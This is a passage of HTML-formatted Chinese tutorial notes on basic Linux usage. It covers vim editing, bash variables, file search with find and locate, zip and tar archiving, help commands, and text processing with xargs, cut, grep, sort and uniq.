class="string">&#x27;y/a-z/A-Z/&#x27;</span> <span class="regexp">*.c</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="vim基础操作">vim基础操作</h2><h3 id="进入vim编辑（普通模式）">进入vim编辑（普通模式）</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> <span class="symbol">&lt;file&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>游标操作：在普通模式下使用方向键或者<kbd>h</kbd>、<kbd>j</kbd>、<kbd>k</kbd>、<kbd>l</kbd>键移动游标</p><table><thead><tr><th>按键</th><th>说明</th></tr></thead><tbody><tr><td><kbd>h</kbd></td><td>左</td></tr><tr><td><kbd>l</kbd></td><td>右（小写 L）</td></tr><tr><td><kbd>j</kbd></td><td>下</td></tr><tr><td><kbd>k</kbd></td><td>上</td></tr><tr><td><kbd>w</kbd></td><td>移动到下一个单词</td></tr><tr><td><kbd>b</kbd></td><td>移动到上一个单词</td></tr></tbody></table></li><li><p>快速操作：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>x</code></td><td>删除游标所在的字符</td></tr><tr><td><code>X</code></td><td>删除游标所在前一个字符</td></tr><tr><td><code>Delete</code></td><td>同 <code>x</code></td></tr><tr><td><code>dd</code></td><td>删除整行</td></tr><tr><td><code>dw</code></td><td>删除一个单词（不适用中文）</td></tr><tr><td><code>d$</code>或<code>D</code></td><td>删除至行尾</td></tr><tr><td><code>d^</code></td><td>删除至行首</td></tr><tr><td><code>dG</code></td><td>删除到文档结尾处</td></tr><tr><td><code>d1G</code></td><td>删至文档首部</td></tr></tbody></table></li></ul><h3 id="写入内容（插入模式）">写入内容（插入模式）</h3><ul><li><p>进入：输入<code>i </code>（insert／插入）或者<code>a</code>（append／追加）</p></li><li><p>退出：按下<kbd>Esc</kbd>回到普通模式</p></li><li><p>更多命令：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>i</code></td><td>在当前光标处进行编辑</td></tr><tr><td><code>I</code></td><td>在行首插入</td></tr><tr><td><code>A</code></td><td>在行末插入</td></tr><tr><td><code>a</code></td><td>在光标后插入编辑</td></tr><tr><td><code>o</code></td><td>在当前行后插入一个新行</td></tr><tr><td><code>O</code></td><td>在当前行前插入一个新行</td></tr><tr><td><code>cw</code></td><td>替换从光标所在位置后到一个单词结尾的字符</td></tr></tbody></table></li></ul><h3 id="命令模式">命令模式</h3><ul><li><p>在普通模式下输入<code>:</code>进入命令模式</p></li><li><p>退出vim：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>:q!</code></td><td>强制退出，不保存</td></tr><tr><td><code>:q</code></td><td>退出</td></tr><tr><td><code>:wq!</code></td><td>强制保存并退出</td></tr><tr><td><code>:w &lt;文件路径&gt;</code></td><td>另存为</td></tr><tr><td><code>:saveas 文件路径</code></td><td>另存为</td></tr><tr><td><code>:x</code></td><td>保存并退出</td></tr><tr><td><code>:wq</code></td><td>保存并退出</td></tr></tbody></table></li><li><p>或者使用<kbd>Shift</kbd> + <kbd>Z</kbd> <kbd>Z</kbd>（按两次z）保存并退出vim</p></li></ul><h2 id="bash操作">bash操作</h2><h3 id="定义变量">定义变量</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> tmp</span><br></pre></td></tr></table></figure><h3 id="变量赋值">变量赋值</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tmp</span><span class="operator">=</span>shiyanlou</span><br></pre></td></tr></table></figure><h3 id="读取变量">读取变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$tmp</span></span><br></pre></td></tr></table></figure><h3 id="新建子终端">新建子终端</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span></span><br></pre></td></tr></table></figure><h3 id="时间测量（time）">时间测量（time）</h3><ul><li><p>time 命令常用于测量一个命令的运行时间，包括实际使用时间（real time）、用户态使用时间（the process spent in user mode）、内核态使用时间（the process spent in kernel mode）。</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">time</span> <span class="selector-attr">[command]</span></span><br></pre></td></tr></table></figure></li><li><p>测量 date 命令运行的时间</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">time</span> <span class="built_in">date</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid393time1421740854918" alt="img"></p><p>从上面的结果可以到：实际运行时间为 0.005s，用户 cpu 时间为 0.001s，系统 cpu 时间为 0.001s。</p><p>其中，用户 CPU 时间和系统 CPU 时间之和为 CPU 时间，即命令占用 CPU 执行的时间总和。实际时间要大于 CPU 时间，因为 Linux 是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。</p></li></ul><h2 id="搜索操作">搜索操作</h2><h3 id="where">where</h3><ul><li><p>只能检索二进制文件（<code>-b</code>)、man帮助文件(<code>-m</code>)和源代码文件(<code>-s</code>)</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> find</span><br></pre></td></tr></table></figure></li></ul><h3 id="which">which</h3><ul><li><p>在 PATH 变量指定的路径中搜索可执行文件的所在位置，一般用来确认系统中是否安装了指定的软件。</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which <span class="tag">&lt;<span class="name">可执行文件名称</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="whereis">whereis</h3><ul><li><p>通过<code>/var/lib/mlocate/mlocate.db</code>数据库查找，主要用于定位可执行文件、源代码文件和帮助文件在文件系统中的位置。whereis 命令还具有搜索源代码、指定备用搜索路径和搜索不寻常项的功能。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>定位可执行文件</td></tr><tr><td><code>-m</code></td><td>定位帮助文件</td></tr><tr><td><code>-s</code></td><td>定位源代码文件</td></tr><tr><td><code>-u</code></td><td>搜索默认路径下除可执行文件、源代码文件和帮助文件以外的其它文件</td></tr><tr><td><code>-B</code></td><td>指定搜索可执行文件的路径</td></tr><tr><td><code>-M</code></td><td>指定搜索帮助文件的路径</td></tr><tr><td><code>-S</code></td><td>指定搜索源代码文件的路径</td></tr></tbody></table></li></ul><h3 id="locate">locate</h3><ul><li><p>locate 命令跟 whereis 命令类似，且它们使用的是相同的数据库。但 whereis 命令只能搜索可执行文件、联机帮助文件和源代码文件，如果要获得更全面的搜索结果，可以使用 locate 命令。</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate [option] <span class="tag">&lt;<span class="name">搜索字符串</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-q</code></td><td>安静模式，不会显示任何错误讯息</td></tr><tr><td><code>-n</code></td><td>至多显示 n 个输出</td></tr><tr><td><code>-r</code></td><td>使用正则表达式做寻找的条件</td></tr><tr><td><code>-V</code></td><td>显示版本信息</td></tr></tbody></table></li><li><p>安装并立即更新一次数据库：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> install locate</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></li></ul><h3 id="find">find</h3><ul><li><p>主要作用是沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应的操作。</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="selector-attr">[path]</span> <span class="selector-attr">[option]</span> <span class="selector-attr">[动作表达式]</span></span><br></pre></td></tr></table></figure><p>默认路径是当前目录，默认表达式为 -print。</p><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td><code>-print</code></td><td>将匹配的文件输出到标准输出</td></tr><tr><td><code>-exec</code></td><td>对匹配的文件执行该参数所给出的 shell 命令</td></tr><tr><td><code>-name</code></td><td>按照文件名查找文件</td></tr><tr><td><code>-type</code></td><td>查找某一类型的文件</td></tr><tr><td><code>-prune</code></td><td>不在当前指定的目录中查找，如果同时使用 <code>-depth</code> 选项，那么 <code>-prune</code> 将被忽略</td></tr><tr><td><code>-user</code></td><td>按照文件属主来查找文件</td></tr><tr><td><code>-group</code></td><td>按照文件所属的组来查找文件</td></tr><tr><td><code>-mtime -n +n</code></td><td>按照文件的更改时间来查找文件，<code>-n</code> 表示文件更改时间距现在小于 n 天，<code>+n</code> 表示文件更改时间距现在大于 n 天</td></tr></tbody></table>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印当前目录下的文件目录列表</span></span><br><span class="line"><span class="built_in">find</span> . -<span class="built_in">print</span></span><br><span class="line"><span class="comment"># 打印当前目录下所有以.txt 结尾的文件名</span></span><br><span class="line"><span class="built_in">find</span> . -name <span class="string">&quot;*.txt&quot;</span> -<span class="built_in">print</span></span><br><span class="line"><span class="comment"># 打印当前目录下所有以.txt 或.pdf 结尾的文件名</span></span><br><span class="line"><span class="built_in">find</span> . \( -name <span class="string">&quot;*.pdf&quot;</span> -or -name <span class="string">&quot;*.txt&quot;</span> \)</span><br><span class="line"><span class="comment"># 打印当前目录下所有不以.txt 结尾的文件名</span></span><br><span class="line"><span class="built_in">find</span> . ! -name <span class="string">&quot;*.txt&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="打包与解压">打包与解压</h2><h3 id="zip">zip</h3><h4 id="打包">打包</h4><ul><li><p>将test目录打包</p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">zip</span> -r -q -o <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p>将目录 /home/shiyanlou/Desktop 打包成一个文件，<code>-r</code>参数表示递归打包包含子目录的全部内容，<code>-q</code> 参数表示安静模式，即不向屏幕输出信息，<code>-o</code>表示输出文件，需在其后紧跟打包输出文件名。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231221181820531.png" alt="image-20231221181820531"></p></li><li><p>加密打包：<code>-e</code></p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">zip</span> -r -<span class="keyword">e</span> -q -o <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221182845455.png" alt="image-20231221182845455"></p></li><li><p>适配Windows换行：<code>-l</code>，将 <code>LF</code> 转换为 <code>CR+LF</code></p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">zip</span> -r -<span class="keyword">l</span> -o <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="解压">解压</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip <span class="tag">&lt;<span class="name">zip_file</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>安静模式：<code>-q</code>，不存在的目录会自动创建</p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -q <span class="keyword">test</span>.<span class="keyword">zip</span> -<span class="keyword">d</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure></li><li><p>仅查看内容：<code>-l</code></p>  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -<span class="keyword">l</span> <span class="keyword">test</span>.<span class="keyword">zip</span></span><br></pre></td></tr></table></figure></li><li><p>指定编码：<code>-O</code></p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -O GBK <span class="tag">&lt;<span class="name">中文压缩文件.zip</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="tar">tar</h3><h4 id="打包-2">打包</h4><ul><li><p>打包为<code>.tar</code></p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -Pcf <span class="keyword">test</span>.tar <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221183411352.png" alt="image-20231221183411352"></p><p><code>-P</code> 保留绝对路径符，<code>-c</code> 表示创建一个 tar 包文件，<code>-f</code> 用于指定创建的文件名，注意文件名必须紧跟在 <code>-f</code> 参数之后</p></li><li><p>打包为<code>.tar.gz</code>：<code>-z</code></p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czf <span class="keyword">test</span>.tar.gz <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221183533959.png" alt="image-20231221183533959"></p></li><li><p>更多格式：</p><table><thead><tr><th>压缩文件格式</th><th>参数</th></tr></thead><tbody><tr><td><code>*.tar.gz</code></td><td><code>-z</code></td></tr><tr><td><code>*.tar.xz</code></td><td><code>-J</code></td></tr><tr><td><code>*tar.bz2</code></td><td><code>-j</code></td></tr></tbody></table></li></ul><h4 id="解压-2">解压</h4><ul><li><p>解压<code>.tar</code></p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf shiyanlou<span class="selector-class">.tar</span> <span class="selector-attr">[-C &lt;tardir&gt;]</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221183711774.png" alt="image-20231221183711774"></p><p>解包一个文件（<code>-x</code> 参数）到指定路径的<strong>已存在</strong>目录（<code>-C</code> 参数）</p></li><li><p>解压<code>.tar.gz</code>：<code>-z</code></p>  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tar</span> -xzf shiyanlou.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231221183815734.png" alt="image-20231221183815734"></p></li></ul><h4 id="不解压查看">不解压查看</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -tf <span class="keyword">test</span>.tar</span><br></pre></td></tr></table></figure><h2 id="帮助操作">帮助操作</h2><h3 id="help">help</h3><ul><li><p>只能用于显示内建命令的帮助信息（仅能在bash中使用）</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span> <span class="built_in">ls</span></span><br></pre></td></tr></table></figure></li><li><p>通常外部命令都有<code>--help</code>参数</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="man">man</h3><ul><li><p>得到的内容比用 help 更多更详细，而且man没有内建与外部命令的区分</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">man</span> <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>按下<kbd>Q</kbd>退出查看</p></li></ul><h3 id="info">info</h3><ul><li><p>安装：</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> install <span class="keyword">info</span></span><br></pre></td></tr></table></figure>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">info</span> ls</span><br></pre></td></tr></table></figure><p>按下<kbd>Q</kbd>退出查看</p></li></ul><h2 id="语句控制">语句控制</h2><h3 id="多语句执行">多语句执行</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句<span class="number">1</span><span class="comment">; 语句2 ;语句3</span></span><br></pre></td></tr></table></figure><h3 id="条件执行（-）">条件执行（&amp;&amp; ||）</h3><ul><li><p><code>&amp;&amp;</code>：如果前面的命令执行结果（不是表示终端输出的内容，而是表示命令执行状态的结果）返回0则执行后面的语句，否则不执行</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语句<span class="selector-tag">A</span> &amp;&amp; 语句<span class="selector-tag">B</span></span><br></pre></td></tr></table></figure></li><li><p><code>||</code>：和<code>&amp;&amp;</code>相反，返回1则执行后面的语句</p></li></ul><h3 id="管道（-）">管道（|）</h3><ul><li><p>将前一语句的输出作为下一语句的输入</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /etc | less</span><br></pre></td></tr></table></figure></li></ul><h2 id="文本处理">文本处理</h2><h3 id="标准输出处理（xargs）">标准输出处理（xargs）</h3><ul><li><p>xargs 命令可以从标准输入接收输入，并把输入转换为一个特定的参数列表。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">command</span> | xargs [<span class="keyword">option</span>] [<span class="keyword">command</span>]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-n</code></td><td>指定每行最大的参数数量</td></tr><tr><td><code>-d</code></td><td>指定分隔符</td></tr></tbody></table></li><li><p>将多行输入转换为单行输出</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt <span class="string">| xargs</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid348time1419486436814" alt="img"></p></li><li><p>将单行输入转换为多行输出</p>  <figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;1<span class="number"> 2 </span>3<span class="number"> 4 </span>5<span class="number"> 6 </span>7&quot; | xargs -n 3</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid348time1419486477811" alt="img"></p></li><li><p>将单行输入转换为多行输出，指定分隔符为 i</p>  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">b</span><span class="selector-class">.txt</span> | <span class="selector-tag">xargs</span> <span class="selector-tag">-d</span> <span class="selector-tag">i</span> <span class="selector-tag">-n</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid348time1419486635856" alt="img"></p></li><li><p>查找当前目录下所有 c 代码文件，统计总行数</p>  <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.c&quot;</span> | xargs wc -l</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid348time1419486674638" alt="img"></p></li></ul><h3 id="文本切分（cut）">文本切分（cut）</h3><ul><li><p>cut 命令是一个将文本按列进行切分的小工具，它可以指定分隔每列的定界符。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-b</code></td><td>以字节为单位进行分割</td></tr><tr><td><code>-c</code></td><td>以字符为单位进行分割</td></tr><tr><td><code>-d</code></td><td>自定义分隔符，默认为制表符</td></tr><tr><td><code>-f</code></td><td>自定义字段</td></tr><tr><td><code>--complement</code></td><td>抽取整个文本行，除了那些由 <code>-c</code> 或 <code>-f</code> 选项指定的文本</td></tr></tbody></table></li><li><p>取出<code>/etc/passwd</code>文件中以<code>:</code>为分隔符的第1个字段和第6个字段</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut <span class="regexp">/etc/</span>passwd -d <span class="string">&#x27;:&#x27;</span> -f <span class="number">1</span>,<span class="number">6</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231217204359115.png" alt="image-20231217204359115"></p></li><li><p>取指定数量字符</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前五个（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c -<span class="number">5</span></span><br><span class="line"><span class="comment"># 前五个之后的（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">5</span>-</span><br><span class="line"><span class="comment"># 第五个</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">5</span></span><br><span class="line"><span class="comment"># 2到5之间的（包含第五个）</span></span><br><span class="line">cut <span class="regexp">/etc/</span>passwd -c <span class="number">2</span>-<span class="number">5</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="匹配字符串（grep）">匹配字符串（grep）</h3><ul><li><p>grep 用来找到文件中的匹配文本，并且能够接受正则表达式和通配符，同时可以用多个 grep 命令选项来生成各种格式的输出。</p></li><li><p>grep 通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回 0，如果搜索不成功，则返回 1，如果搜索的文件不存在，则返回 2</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> [option] <span class="symbol">&lt;pattern&gt;</span> <span class="symbol">&lt;file&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>计算找到‘搜寻字符串’（即 pattern）的次数</td></tr><tr><td><code>-i</code></td><td>忽略大小写的不同，所以大小写视为相同</td></tr><tr><td><code>-n</code></td><td>输出行号</td></tr><tr><td><code>-v</code></td><td>反向选择，打印不匹配的行</td></tr><tr><td><code>-r</code></td><td>递归搜索</td></tr><tr><td><code>--color=auto</code></td><td>将找到的关键词部分加上颜色显示</td></tr></tbody></table></li><li><p>将<code>/etc/passwd</code>文件中出现 root 的行取出来，关键词部分加上颜色显示</p>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> <span class="string">&quot;root&quot;</span> <span class="regexp">/etc/</span>passwd --color=auto</span><br><span class="line">cat <span class="regexp">/etc/</span>passwd | <span class="keyword">grep</span> <span class="string">&quot;root&quot;</span> --color=auto</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219124625381.png" alt="image-20231219124625381"></p></li><li><p>将<code>/etc/passwd</code>文件中没有出现 root 和 nologin 的行取出来</p>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -v <span class="string">&quot;root&quot;</span> <span class="regexp">/etc/</span>passwd | <span class="keyword">grep</span> -v <span class="string">&quot;nologin&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219124700264.png" alt="image-20231219124700264"></p></li></ul><h3 id="内容统计（wc）">内容统计（wc）</h3><ul><li><p>wc 命令是一个统计的工具，主要用来显示文件所包含的行、字和字节数。</p>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>统计字节数</td></tr><tr><td><code>-l</code></td><td>统计行数</td></tr><tr><td><code>-m</code></td><td>统计字符数，这个标志不能与 <code>-c</code> 标志一起使用</td></tr><tr><td><code>-w</code></td><td>统计字数，一个字被定义为由空白、跳格或换行字符分隔的字符串</td></tr><tr><td><code>-L</code></td><td>打印最长行的长度</td></tr></tbody></table></li><li><p>统计文件数</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计/bin目录下的命令个数，即文件个数</span></span><br><span class="line"><span class="built_in">ls</span> /bin | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure></li></ul><h3 id="排序（sort）">排序（sort）</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort [<span class="keyword">option</span>] &lt;<span class="keyword">file</span>&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-n</code></td><td>基于字符串的长度来排序，使用此选项允许根据数字值排序，而不是字母值</td></tr><tr><td><code>-k</code></td><td>指定排序关键字</td></tr><tr><td><code>-b</code></td><td>默认情况下，对整行进行排序，从每行的第一个字符开始。这个选项导致 sort 程序忽略每行开头的空格，从第一个非空白字符开始排序</td></tr><tr><td><code>-m</code></td><td>只合并多个输入文件</td></tr><tr><td><code>-r</code></td><td>按相反顺序排序，结果按照降序排列，而不是升序</td></tr><tr><td><code>-t</code></td><td>自定义分隔符，默认为制表符</td></tr></tbody></table><ul><li><p>列出<code>/usr/share/</code>目录下使用空间最多的前 10 个目录文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -s /usr/share/* | <span class="built_in">sort</span> -nr | <span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219130029985.png" alt="image-20231219130029985"></p></li><li><p>对 ls 命令输出信息中的空间使用大小字段进行排序</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /usr/bin/ | <span class="built_in">sort</span> -nr -k 5 | <span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231219130116293.png" alt="image-20231219130116293"></p></li></ul><h3 id="去重（uniq）">去重（uniq）</h3><ul><li><p>uniq 从标准输入或单个文件名参数接受数据有序列表，默认情况下，从数据列表中删除任何重复行。</p></li><li><p>uniq 只能用于排过序的数据输入，因此，uniq 要么使用管道，要么将排过序的文件作为输入，并总是以这种方式与 sort 命令结合起来使用。</p>  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uni<span class="string">q [option]</span> &lt;file&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-c</code></td><td>在每行前加上表示相应行目出现次数的前缀编号</td></tr><tr><td><code>-d</code></td><td>只输出重复的行</td></tr><tr><td><code>-u</code></td><td>只显示唯一的行</td></tr><tr><td><code>-D</code></td><td>显示所有重复的行</td></tr><tr><td><code>-f</code></td><td>比较时跳过前 n 列</td></tr><tr><td><code>-i</code></td><td>在比较的时候不区分大小写</td></tr><tr><td><code>-s</code></td><td>比较时跳过前 n 个字符</td></tr><tr><td><code>-w</code></td><td>对每行第 n 个字符以后的内容不作对照</td></tr></tbody></table></li><li><p>找出<code>/bin</code>目录和<code>/usr/bin</code>目录下所有相同的命令</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /bin /usr/bin | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -d</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid3372labid370time1420781011797" 